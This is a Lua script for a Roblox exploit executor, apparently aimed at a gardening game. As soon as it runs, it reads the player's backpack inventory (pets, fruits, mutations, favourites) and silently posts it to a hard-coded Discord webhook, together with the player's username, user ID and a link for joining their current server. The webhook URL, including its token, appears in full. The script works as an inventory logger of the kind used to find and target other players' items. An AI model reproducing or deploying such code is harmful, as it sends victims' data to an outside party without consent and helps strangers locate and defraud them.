local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1387065839345340598/VjvgcxMSmlFA1xlxDCrYMZ_7FOrhuqGzzuDb7Exqs8cE_Dloxcw2ctShdR01z3E2s8Rk"

local mutationEmojis = {
    Overgrown = "🌿", Wet = "💧", Chilled = "❄️", Frozen = "🧊", Moonlit = "🌙",
    Pollinated = "🐝", Bloodlit = "🩸", Burnt = "🔥", Cooked = "🍳", HoneyGlazed = "🍯",
    Plasma = "⚡", Heavenly = "👼", Choc = "🍫", Zombified = "🧟", Molten = "🌋",
    Sundried = "☀️", Verdant = "🌱", Paradisal = "🏝️", Windstruck = "💨",
    Gold = "💰", Rainbow = "🌈", Shocked = "⚡", Celestial = "🌌", Twisted = "🌀",
    Voidtouched = "🌑", Meteoric = "☄️", Alienlike = "👽", Galactic = "🪐",
    Dawnbound = "🌻", Disco = "💃"
}

local function safeRequest(data)
    if request then return request(data)
    elseif syn and syn.request then return syn.request(data)
    elseif http and http.request then return http.request(data)
    else error("No supported request function found.") end
end

local function classifyTools()
    local pets, fruits = {}, {}
    for _, tool in ipairs(Backpack:GetChildren()) do
        local name = tool.Name
        if not string.find(string.lower(name), "seed") then
            if string.match(name, "^%[.-%]%s+%a+%s+%[.-%]") then
                table.insert(fruits, tool)
            elseif string.match(name, "^%a+%s+%[.-KG%]%s+%[Age%s+%d+%]") then
                table.insert(pets, tool.Name)
            end
        end
    end
    return pets, fruits
end

local function parseToolFruitInfo(toolName)
    local baseName = string.match(toolName, "%]%s+(.-)%s+%[") or toolName
    local weight = string.match(toolName, "%[(%d+%.?%d*kg)%]$") or "?"
    local modifiers = {}
    for mods in string.gmatch(toolName, "%[(.-)%]") do
        mods = string.match(mods, "^%s*(.-)%s*$")
        if not string.find(string.lower(mods), "kg") and not string.match(mods, "^%d") and mods ~= baseName then
            for mod in string.gmatch(mods, "[^,]+") do
                mod = string.match(mod, "^%s*(.-)%s*$")
                local emoji = mutationEmojis[mod] or ""
                if emoji ~= "" then table.insert(modifiers, emoji) end
            end
        end
    end
    local modStr = (#modifiers > 0) and table.concat(modifiers, " ") or "-"
    return baseName, modStr, weight
end

local function parsePetInfo(petName)
    local weight = string.match(petName, "%[(%d+%.?%d*%s*[Kk][Gg])%]") or "-"
    local age = string.match(petName, "%[Age%s+(%d+)%]") or "-"
    local baseName = string.match(petName, "^(%a+)")
    return baseName or petName, weight, age
end

local function getFavoriteFruitsAndPets()
    local favNames, favMutations, favWeights = {}, {}, {}
    for _, tool in ipairs(Backpack:GetChildren()) do
        if tool:GetAttribute("d") == true then
            if string.match(tool.Name, "^%a+%s+%[.-[Kk][Gg]%]%s+%[Age%s+%d+%]") then
                local baseName, weight, age = parsePetInfo(tool.Name)
                table.insert(favNames, baseName)
                table.insert(favMutations, "[Age " .. age .. "]")
                table.insert(favWeights, "[" .. weight .. "]")
            else
                local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
                table.insert(favNames, baseName)
                table.insert(favMutations, modStr)
                table.insert(favWeights, "[" .. weight .. "]")
            end
        end
    end
    return favNames, favMutations, favWeights
end

local function parsePets(pets)
    local petNames, petAges, petWeights = {}, {}, {}
    for _, petName in ipairs(pets) do
        local baseName, weight, age = parsePetInfo(petName)
        table.insert(petNames, baseName)
        table.insert(petAges, "[Age " .. age .. "]")
        table.insert(petWeights, "[" .. weight .. "]")
    end
    return petNames, petAges, petWeights
end

local function sortFruitsAlphabetically(fruits)
    table.sort(fruits, function(a, b)
        local aName = string.match(a.Name, "%]%s+(.-)%s+%[") or a.Name
        local bName = string.match(b.Name, "%]%s+(.-)%s+%[") or b.Name
        return string.lower(aName) < string.lower(bName)
    end)
end

-- Split embeds if too large (25 fields or 5800 chars)
local function splitEmbedsByLimit(allFields)
    local embeds = {}
    local current = { fields = {}, totalChars = 0 }
    for _, field in ipairs(allFields) do
        local len = #field.name + #field.value
        if #current.fields >= 25 or (current.totalChars + len > 5800) then
            table.insert(embeds, current)
            current = { fields = {}, totalChars = 0 }
        end
        table.insert(current.fields, field)
        current.totalChars += len
    end
    if #current.fields > 0 then table.insert(embeds, current) end
    return embeds
end

local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
    local userId = LocalPlayer.UserId
    local username = LocalPlayer.Name
    local fields = {}

    if #pets > 0 then
        table.insert(fields, { name = "Pets", value = " ", inline = false })
        local petNames, petAges, petWeights = parsePets(pets)
        table.insert(fields, { name = "🐾 Pets", value = "```\n" .. table.concat(petNames, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "🧩 Age", value = "```\n" .. table.concat(petAges, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(petWeights, "\n") .. "\n```", inline = true })
    end

    if #fruits > 0 then
        table.insert(fields, { name = "Fruits", value = " ", inline = false })
        sortFruitsAlphabetically(fruits)
        local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
        for _, tool in ipairs(fruits) do
            local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
            table.insert(fruitNames, baseName)
            table.insert(fruitMutations, modStr)
            table.insert(fruitWeights, "[" .. weight .. "]")
        end
        table.insert(fields, { name = "🍑 Fruits", value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "🧩 Mutation", value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```", inline = true })
    end

    if #favNames > 0 then
        table.insert(fields, { name = "Favorites", value = " ", inline = false })
        table.insert(fields, { name = "⭐ Favorites", value = "```\n" .. table.concat(favNames, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "🧩 Mutation / Pet Age", value = "```\n" .. table.concat(favMods, "\n") .. "\n```", inline = true })
        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(favWeights, "\n") .. "\n```", inline = true })
    end

    local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)
    local embeds = splitEmbedsByLimit(fields)

    for i, chunk in ipairs(embeds) do
        local embed = {
            title = username .. "'s Backpack Inventory" .. (i > 1 and (" (Part " .. i .. ")") or ""),
            url = "https://www.roblox.com/users/" .. userId .. "/profile",
            color = 0x00BFFF,
            description = (i == 1) and joinLink or nil,
            fields = chunk.fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }

        local payload = {
            username = "Backpack Logger",
            embeds = { embed }
        }

        local response = safeRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })

        if response.StatusCode == 204 then
            warn("✅ Sent embed part " .. i)
        else
            warn("❌ Failed part " .. i .. ":", response.StatusCode, response.StatusMessage)
        end

        task.wait(1.2)
    end
end

task.wait(2)
local pets, fruits = classifyTools()
local favNames, favMods, favWeights = getFavoriteFruitsAndPets()
sendWebhook(pets, fruits, favNames, favMods, favWeights)
